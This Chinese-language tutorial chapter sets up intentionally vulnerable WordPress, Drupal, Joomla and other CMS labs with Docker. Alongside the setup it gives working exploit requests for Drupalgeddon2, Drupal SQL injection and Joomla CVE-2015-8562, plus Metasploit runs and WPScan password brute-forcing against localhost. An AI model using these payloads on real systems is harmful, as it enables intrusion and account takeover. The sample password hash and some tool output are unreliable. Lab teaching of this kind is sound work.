# 第21章 CMS漏洞环境搭建

## 21.1 WordPress漏洞环境

### 21.1.1 【Docker】WordPress + MySQL环境搭建

#### 环境说明
- WordPress最新版 + MySQL 5.7
- 用于快速搭建WordPress测试环境

#### 操作位置：本地终端（Linux/macOS/Windows PowerShell）

#### 步骤1：创建docker-compose.yml文件

```yaml
version: '3.8'

services:
  wordpress:
    image: wordpress:latest
    container_name: wordpress-latest
    ports:
      - "8080:80"
    environment:
      WORDPRESS_DB_HOST: mysql:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress123
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_data:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: wordpress-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress123
    volumes:
      - mysql_data:/var/lib/mysql
    restart: always

volumes:
  wordpress_data:
  mysql_data:
```

#### 步骤2：启动容器

```bash
docker-compose up -d
```

**预期输出：**
```
Creating network "wordpress_default" with the default driver
Creating volume "wordpress_wordpress_data" with default driver
Creating volume "wordpress_mysql_data" with default driver
Creating wordpress-mysql ... done
Creating wordpress-latest ... done
```

#### 步骤3：访问WordPress
- 访问地址：http://localhost:8080
- 首次访问需要进行安装配置
- 默认数据库信息：
  - 数据库名：wordpress
  - 用户名：wordpress
  - 密码：wordpress123
  - 数据库主机：mysql:3306

#### 步骤4：安装完成后默认信息
- 管理员账号：自行设置
- 后台地址：http://localhost:8080/wp-admin

---

### 21.1.2 【Docker】指定版本WordPress漏洞环境

#### WordPress 4.9.8 漏洞环境

```yaml
version: '3.8'

services:
  wordpress:
    image: wordpress:4.9.8-apache
    container_name: wordpress-4.9.8
    ports:
      - "8081:80"
    environment:
      WORDPRESS_DB_HOST: mysql:3306
      WORDPRESS_DB_USER: wordpress
      WORDPRESS_DB_PASSWORD: wordpress123
      WORDPRESS_DB_NAME: wordpress
    volumes:
      - wordpress_498_data:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: wordpress-498-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: wordpress
      MYSQL_USER: wordpress
      MYSQL_PASSWORD: wordpress123
    volumes:
      - mysql_498_data:/var/lib/mysql
    restart: always

volumes:
  wordpress_498_data:
  mysql_498_data:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8081

---

### 21.1.3 【Linux环境】手动搭建LAMP + WordPress

#### 操作位置：Linux服务器终端（Ubuntu 20.04）

#### 步骤1：安装Apache

```bash
sudo apt update
sudo apt install apache2 -y
```

**预期输出：**
```
Setting up apache2 (2.4.41-4ubuntu3.x) ...
Created symlink /etc/systemd/system/multi-user.target.wants/apache2.service → /lib/systemd/system/apache2.service.
```

#### 步骤2：安装MySQL

```bash
sudo apt install mysql-server -y
sudo mysql_secure_installation
```

**预期输出（mysql_secure_installation交互）：**
```
Securing the MySQL server deployment.

Connecting to MySQL using a blank password.

VALIDATE PASSWORD COMPONENT can be used to test passwords
and improve security. It checks the strength of password
and allows the users to set only those passwords which are
secure enough. Would you like to setup VALIDATE PASSWORD component?

Press y|Y for Yes, any other key for No: n
...
Remove anonymous users? (Press y|Y for Yes, any other key for No) : y
...
Disallow root login remotely? (Press y|Y for Yes, any other key for No) : y
...
Remove test database and access to it? (Press y|Y for Yes, any other key for No) : y
...
Reload privilege tables now? (Press y|Y for Yes, any other key for No) : y
```

#### 步骤3：创建WordPress数据库

```bash
sudo mysql -u root -p
```

**在MySQL中执行：**
```sql
CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
CREATE USER 'wordpress'@'localhost' IDENTIFIED BY 'wordpress123';
GRANT ALL ON wordpress.* TO 'wordpress'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

#### 步骤4：安装PHP

```bash
sudo apt install php libapache2-mod-php php-mysql php-curl php-gd php-mbstring php-xml php-xmlrpc php-soap php-intl php-zip -y
```

#### 步骤5：下载并配置WordPress

```bash
cd /tmp
wget https://wordpress.org/wordpress-4.9.8.tar.gz
tar -xzvf wordpress-4.9.8.tar.gz
sudo cp -r wordpress/* /var/www/html/
sudo chown -R www-data:www-data /var/www/html/
sudo chmod -R 755 /var/www/html/
```

#### 步骤6：配置Apache

```bash
sudo nano /etc/apache2/sites-available/wordpress.conf
```

**配置内容：**
```apache
<VirtualHost *:80>
    ServerAdmin admin@example.com
    DocumentRoot /var/www/html
    ServerName example.com
    ServerAlias www.example.com

    <Directory /var/www/html/>
        AllowOverride All
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

```bash
sudo a2ensite wordpress.conf
sudo a2enmod rewrite
sudo systemctl restart apache2
```

#### 访问地址：
- http://服务器IP
- 数据库配置使用上述创建的数据库信息

---

### 21.1.4 插件漏洞环境

#### WooCommerce插件漏洞环境

【通用】

**操作位置：WordPress后台插件管理页面**

**步骤1：安装旧版本WooCommerce**
1. 访问 WordPress 后台 → 插件 → 添加新插件
2. 搜索 "WooCommerce"
3. 选择 3.x 版本（存在已知漏洞）
4. 安装并启用

**或使用WP-CLI安装：**

```bash
# 安装WP-CLI
curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
chmod +x wp-cli.phar
sudo mv wp-cli.phar /usr/local/bin/wp

# 安装指定版本WooCommerce
cd /var/www/html
wp plugin install woocommerce --version=3.5.0 --allow-root
wp plugin activate woocommerce --allow-root
```

#### Contact Form 7 漏洞环境

```bash
cd /var/www/html
wp plugin install contact-form-7 --version=5.1.1 --allow-root
wp plugin activate contact-form-7 --allow-root
```

---

### 21.1.5 WPScan扫描使用

#### 【Linux环境】【Kali Linux】WPScan安装与使用

**操作位置：Kali Linux终端**

**步骤1：安装WPScan**

```bash
sudo apt update
sudo apt install wpscan -y
```

**或使用Gem安装：**
```bash
gem install wpscan
```

**步骤2：基本扫描**

```bash
wpscan --url http://localhost:8080
```

**预期输出：**
```
_______________________________________________________________
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___ __ _ _ __
          \ \/  \/ / |  ___/ \___ \ / __/ _` | '_ \
           \  /\  /  | |     ____) | (_| (_| | | | |
            \/  \/   |_|    |_____/ \___\__,_|_| |_|

                    WPScan v3.8.x
_______________________________________________________________

[+] URL: http://localhost:8080/
[+] Started: [日期时间]

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.x
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://localhost:8080/?feed=rss2, <generator>https://wordpress.org/?v=4.9.8</generator>
```

**步骤3：枚举用户**

```bash
wpscan --url http://localhost:8080 --enumerate u
```

**步骤4：扫描插件漏洞**

```bash
wpscan --url http://localhost:8080 --enumerate vp
```

**步骤5：暴力破解密码**

```bash
wpscan --url http://localhost:8080 --usernames admin --passwords /usr/share/wordlists/rockyou.txt
```

**步骤6：使用API Token获取更多漏洞信息**

```bash
wpscan --url http://localhost:8080 --api-token YOUR_API_TOKEN
```

---

### 21.1.6 常见问题

**Q1: Docker启动后WordPress无法连接数据库？**
A: 检查docker-compose.yml中数据库主机名是否正确，应该使用服务名（如mysql）而不是localhost。确保depends_on配置正确。

**Q2: WPScan扫描时提示SSL证书错误？**
A: 使用`--disable-tls-checks`参数跳过证书验证：
```bash
wpscan --url https://target.com --disable-tls-checks
```

**Q3: 手动安装WordPress时提示文件权限问题？**
A: 确保web服务器用户（www-data）对/var/www/html有正确的权限：
```bash
sudo chown -R www-data:www-data /var/www/html
sudo chmod -R 755 /var/www/html
```

**Q4: 如何降级WordPress版本？**
A: 可以手动下载旧版本文件覆盖，或使用WP-CLI：
```bash
wp core update --version=4.9.8 --force --allow-root
```

---

## 21.2 Drupal漏洞环境

### 21.2.1 【Docker】Drupal漏洞版本安装

#### Drupal 7.x 漏洞环境

**操作位置：本地终端**

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  drupal:
    image: drupal:7.67-apache
    container_name: drupal-7
    ports:
      - "8090:80"
    environment:
      DRUPAL_DB_HOST: mysql:3306
      DRUPAL_DB_NAME: drupal
      DRUPAL_DB_USER: drupal
      DRUPAL_DB_PASSWORD: drupal123
    volumes:
      - drupal_modules:/var/www/html/modules
      - drupal_profiles:/var/www/html/profiles
      - drupal_themes:/var/www/html/themes
      - drupal_sites:/var/www/html/sites
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: drupal-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: drupal
      MYSQL_USER: drupal
      MYSQL_PASSWORD: drupal123
    volumes:
      - drupal_mysql_data:/var/lib/mysql
    restart: always

volumes:
  drupal_modules:
  drupal_profiles:
  drupal_themes:
  drupal_sites:
  drupal_mysql_data:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8090

**默认安装配置：**
- 数据库类型：MySQL
- 数据库名：drupal
- 数据库用户名：drupal
- 数据库密码：drupal123
- 数据库主机：mysql

---

### 21.2.2 【Docker】Drupalgeddon2 (CVE-2018-7600) 环境

#### 环境说明
Drupalgeddon2是Drupal 7.x和8.x中的一个严重远程代码执行漏洞（CVE-2018-7600）。

**操作位置：本地终端**

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  drupal:
    image: drupal:7.57-apache
    container_name: drupal-drupalgeddon2
    ports:
      - "8091:80"
    volumes:
      - drupal_gg2_sites:/var/www/html/sites
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: drupal-gg2-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: drupal
      MYSQL_USER: drupal
      MYSQL_PASSWORD: drupal123
    volumes:
      - drupal_gg2_mysql:/var/lib/mysql
    restart: always

volumes:
  drupal_gg2_sites:
  drupal_gg2_mysql:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8091

#### 漏洞验证方法

**操作位置：攻击机终端（Kali Linux）**

**步骤1：使用Droopescan扫描**

```bash
# 安装Droopescan
pip install droopescan

# 扫描Drupal版本
droopescan scan drupal -u http://localhost:8091
```

**步骤2：手动验证CVE-2018-7600**

```bash
# 使用curl测试RCE
curl -k -X POST 'http://localhost:8091/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
```

**预期输出（包含命令执行结果）：**
```
[{"command":"insert","method":"replaceWith","selector":null,"data":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","settings":null}]
```

**步骤3：使用Metasploit利用**

```bash
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS localhost
set RPORT 8091
set TARGETURI /
run
```

**预期输出：**
```
[*] Started reverse TCP handler on x.x.x.x:4444
[*] Sending stage (38288 bytes) to x.x.x.x
[*] Meterpreter session 1 opened (x.x.x.x:4444 -> x.x.x.x:xxxx)
```

---

### 21.2.3 【Docker】Drupal 7.x SQL注入环境

#### 环境说明
Drupal 7.x 版本中存在SQL注入漏洞（CVE-2014-3704，Drupageddon）。

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  drupal:
    image: drupal:7.31-apache
    container_name: drupal-sqli
    ports:
      - "8092:80"
    volumes:
      - drupal_sqli_sites:/var/www/html/sites
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: drupal-sqli-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: drupal
      MYSQL_USER: drupal
      MYSQL_PASSWORD: drupal123
    volumes:
      - drupal_sqli_mysql:/var/lib/mysql
    restart: always

volumes:
  drupal_sqli_sites:
  drupal_sqli_mysql:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8092

#### 漏洞验证方法

**操作位置：攻击机终端**

**SQL注入测试：**

```bash
# 测试CVE-2014-3704 SQL注入
curl -X POST 'http://localhost:8092/?q=node&destination=node' \
  -d "pass=test&name[0%20;update+users+set+name%3D'admin'+,+pass+%3d+%24S%24DxVuoJ7Tz0zV1iV6Qxw5YgM5O5Q5e5K5f5g5h5i5j5k5l5m5n5o5p5q5r5s5t5u5v5w5x5y5z09%23+where+uid%3D1;--]=admin&op=Log+in&form_id=user_login_block"
```

**使用SQLMap：**

```bash
sqlmap -u "http://localhost:8092/?q=node" --data="name=test&pass=test&form_id=user_login_block" -p name --dbs
```

---

### 21.2.4 常见问题

**Q1: Drupal安装时数据库连接失败？**
A: 确保数据库服务已启动，并且数据库主机使用服务名（mysql）而不是localhost。检查数据库用户名和密码是否匹配。

**Q2: Drupalgeddon2漏洞利用失败？**
A: 确保Drupal版本正确（7.57或更早版本）。某些情况下需要先完成Drupal的安装流程，确保有用户注册表单可用。

**Q3: 如何查看Drupal版本？**
A: 方法1：查看页面源代码中的meta标签
方法2：访问 /CHANGELOG.txt
方法3：使用droopescan扫描

---

## 21.3 Joomla漏洞环境

### 21.3.1 【Docker】Joomla安装

**操作位置：本地终端**

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  joomla:
    image: joomla:3.4.6-apache
    container_name: joomla-346
    ports:
      - "8100:80"
    environment:
      JOOMLA_DB_HOST: mysql:3306
      JOOMLA_DB_NAME: joomla
      JOOMLA_DB_USER: joomla
      JOOMLA_DB_PASSWORD: joomla123
    volumes:
      - joomla_data:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: joomla-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: joomla
      MYSQL_USER: joomla
      MYSQL_PASSWORD: joomla123
    volumes:
      - joomla_mysql_data:/var/lib/mysql
    restart: always

volumes:
  joomla_data:
  joomla_mysql_data:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8100

**后台地址：** http://localhost:8100/administrator

**安装配置：**
- 数据库类型：MySQLi
- 数据库主机：mysql
- 数据库用户名：joomla
- 数据库密码：joomla123
- 数据库名：joomla

---

### 21.3.2 Joomla 3.4.6 远程代码执行

#### 漏洞说明
Joomla 3.4.6 存在远程代码执行漏洞（CVE-2015-8562），通过HTTP头注入实现RCE。

#### 漏洞验证方法

**操作位置：攻击机终端（Kali Linux）**

**步骤1：使用curl测试**

```bash
# 测试HTTP头注入
curl -v 'http://localhost:8100/' \
  -H 'User-Agent: 123}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x00\x00disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:6:"assert";s:10:"javascript";i:9999;s:8:"feed_url";s:36:"phpinfo();JFactory::getConfig();exit";}i:1;s:4:"init";}}s:13:"\x00\x00connection";i:1;}'
```

**步骤2：使用Metasploit利用**

```bash
msfconsole
use exploit/multi/http/joomla_http_header_rce
set RHOSTS localhost
set RPORT 8100
set TARGETURI /
run
```

**步骤3：使用JoomlaScan扫描**

```bash
# 安装JoomlaScan
git clone https://github.com/drego85/JoomlaScan.git
cd JoomlaScan
pip install -r requirements.txt

# 扫描
python joomlascan.py -u http://localhost:8100
```

**预期输出：**
```
    _  _   _   ___  __  __    _    ____
   | || | /_\ / _ \|  \/  |  /_\  / ___|
   | __ |/ _ \ | | | |\/| | / _ \| |
   |_||_/_/ \_\_|_|_|  |_|/_/ \_\_|
   
[+] Target: http://localhost:8100
[+] Joomla! Version: 3.4.6
[+] Detected vulnerabilities:
    - CVE-2015-8562 RCE via HTTP Header
```

---

### 21.3.3 组件漏洞环境

#### Joomla组件漏洞测试环境

**【通用】操作位置：Joomla后台**

**常用漏洞组件安装：**

1. **com_fields 组件漏洞**
   - Joomla 3.7.x 核心组件
   - 漏洞：SQL注入（CVE-2017-8917）

2. **com_k2 组件漏洞**
   - 安装K2 v2.8.0或更早版本
   - 存在SQL注入、文件上传等漏洞

**安装方法：**
1. 登录 Joomla 后台
2. 进入 "扩展" → "管理" → "安装"
3. 上传组件安装包或从URL安装

**使用droopescan扫描组件：**

```bash
droopescan scan joomla -u http://localhost:8100
```

---

### 21.3.4 常见问题

**Q1: Joomla安装后无法登录后台？**
A: 确保管理员账号密码正确。如果忘记密码，可以直接在数据库中重置：
```sql
UPDATE jos_users SET password = MD5('newpassword') WHERE username = 'admin';
```
注意：Joomla 3.x 使用更强的哈希算法，建议使用官方重置方法。

**Q2: 如何快速判断Joomla版本？**
A: 方法1：访问 /administrator/manifests/files/joomla.xml
方法2：查看页面源代码中的generator meta标签
方法3：使用joomlascan或droopescan扫描

**Q3: CVE-2015-8562利用失败？**
A: 确保Joomla版本在3.0.0到3.4.6之间。某些情况下需要特定的PHP版本配置。

---

## 21.4 其他CMS

### 21.4.1 Discuz漏洞环境

#### 【Docker】Discuz! X3.4 漏洞环境

**操作位置：本地终端**

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  discuz:
    image: skyzhou/docker-discuz:latest
    container_name: discuz
    ports:
      - "8110:80"
    volumes:
      - discuz_data:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: discuz-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: discuz
      MYSQL_USER: discuz
      MYSQL_PASSWORD: discuz123
    volumes:
      - discuz_mysql_data:/var/lib/mysql
    restart: always

volumes:
  discuz_data:
  discuz_mysql_data:
```

**或手动搭建：**

```yaml
version: '3.8'

services:
  web:
    image: php:5.6-apache
    container_name: discuz-web
    ports:
      - "8110:80"
    volumes:
      - ./discuz:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: discuz-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: discuz
      MYSQL_USER: discuz
      MYSQL_PASSWORD: discuz123
    volumes:
      - discuz_mysql:/var/lib/mysql
    restart: always

volumes:
  discuz_mysql:
```

**启动命令：**
```bash
docker-compose up -d
```

**访问地址：** http://localhost:8110

**安装信息：**
- 数据库主机：mysql
- 数据库名：discuz
- 数据库用户：discuz
- 数据库密码：discuz123

**常见漏洞版本：**
- Discuz! X3.4 - SSRF漏洞、XSS漏洞
- Discuz! X3.2 - SQL注入、文件上传漏洞
- Discuz! X2.5 - 多种漏洞

---

### 21.4.2 PHPCMS漏洞环境

#### 【Docker】PHPCMS v9漏洞环境

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  phpcms:
    image: php:5.6-apache
    container_name: phpcms
    ports:
      - "8120:80"
    volumes:
      - ./phpcms:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: phpcms-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: phpcms
      MYSQL_USER: phpcms
      MYSQL_PASSWORD: phpcms123
    volumes:
      - phpcms_mysql:/var/lib/mysql
    restart: always

volumes:
  phpcms_mysql:
```

**启动命令：**
```bash
# 下载PHPCMS v9
mkdir phpcms
cd phpcms
wget http://download.phpcms.cn/v9/9.6.0/phpcms_v9.6.0_UTF8.zip
unzip phpcms_v9.6.0_UTF8.zip
cd ..

docker-compose up -d
```

**访问地址：** http://localhost:8120

**安装目录：** /install

**常见漏洞：**
- PHPCMS v9.6.0 - SQL注入漏洞
- PHPCMS v9.5.x - 文件上传漏洞
- PHPCMS v9.6.1 - 远程代码执行

---

### 21.4.3 Dedecms漏洞环境

#### 【Docker】织梦CMS漏洞环境

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  dedecms:
    image: php:5.6-apache
    container_name: dedecms
    ports:
      - "8130:80"
    volumes:
      - ./dedecms:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: dedecms-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: dedecms
      MYSQL_USER: dedecms
      MYSQL_PASSWORD: dedecms123
    volumes:
      - dedecms_mysql:/var/lib/mysql
    restart: always

volumes:
  dedecms_mysql:
```

**启动命令：**
```bash
mkdir dedecms
cd dedecms
# 下载DedeCMS V5.7 SP2
wget https://xxx/dedecms-V57-SP2-utf8.zip
unzip dedecms-V57-SP2-utf8.zip
cd ..

docker-compose up -d
```

**访问地址：** http://localhost:8130

**后台地址：** http://localhost:8130/dede

**常见漏洞：**
- Dedecms V5.7 SP2 - 后台文件上传GetShell
- Dedecms V5.7 - 前台SQL注入
- Dedecms V5.6 - 多种漏洞

---

### 21.4.4 Typecho漏洞环境

#### 【Docker】Typecho漏洞环境

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  typecho:
    image: php:7.0-apache
    container_name: typecho
    ports:
      - "8140:80"
    volumes:
      - ./typecho:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: typecho-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: typecho
      MYSQL_USER: typecho
      MYSQL_PASSWORD: typecho123
    volumes:
      - typecho_mysql:/var/lib/mysql
    restart: always

volumes:
  typecho_mysql:
```

**启动命令：**
```bash
mkdir typecho
cd typecho
wget https://github.com/typecho/typecho/releases/download/v1.1-17.10.30-release/1.1.17.10.30.-release.tar.gz
tar -xzvf 1.1.17.10.30.-release.tar.gz
cd ..

docker-compose up -d
```

**访问地址：** http://localhost:8140

**常见漏洞：**
- Typecho 1.1 - 反序列化漏洞（CVE-2018-16385）
- Typecho 1.2 - 前台文件写入漏洞

---

### 21.4.5 CmsEasy漏洞环境

#### 【Docker】CmsEasy漏洞环境

**docker-compose.yml配置：**

```yaml
version: '3.8'

services:
  cmseasy:
    image: php:5.6-apache
    container_name: cmseasy
    ports:
      - "8150:80"
    volumes:
      - ./cmseasy:/var/www/html
    depends_on:
      - mysql
    restart: always

  mysql:
    image: mysql:5.7
    container_name: cmseasy-mysql
    environment:
      MYSQL_ROOT_PASSWORD: root123
      MYSQL_DATABASE: cmseasy
      MYSQL_USER: cmseasy
      MYSQL_PASSWORD: cmseasy123
    volumes:
      - cmseasy_mysql:/var/lib/mysql
    restart: always

volumes:
  cmseasy_mysql:
```

**启动命令：**
```bash
mkdir cmseasy
cd cmseasy
# 下载CmsEasy
wget http://xxx/cmseasy_v5.7_utf8.zip
unzip cmseasy_v5.7_utf8.zip
cd ..

docker-compose up -d
```

**访问地址：** http://localhost:8150

**常见漏洞：**
- CmsEasy 5.7 - SQL注入、XSS、文件上传
- CmsEasy 6.x - 多种漏洞

---

### 21.4.6 常见问题

**Q1: 为什么很多CMS漏洞环境推荐使用PHP 5.6？**
A: 因为很多旧版本CMS只兼容PHP 5.x，而且PHP 5.x的安全配置相对较弱，更容易触发漏洞。

**Q2: 如何快速找到CMS漏洞POC？**
A: 推荐网站：
- Exploit-DB: https://www.exploit-db.com/
- GitHub: 搜索 CMS名称 + CVE编号
- Vulhub: https://github.com/vulhub/vulhub

**Q3: CMS环境搭建完成后如何验证漏洞？**
A: 1. 使用专用扫描工具（WPScan、Droopescan、JoomlaScan等）
   2. 使用MSF对应模块测试
   3. 手动验证漏洞POC
   4. 对照CVE编号查找验证脚本

**Q4: 为什么Docker方式推荐使用MySQL 5.7而不是8.0？**
A: 旧版本CMS大多是为MySQL 5.x开发的，MySQL 8.0的认证插件和语法有变化，可能导致兼容性问题。
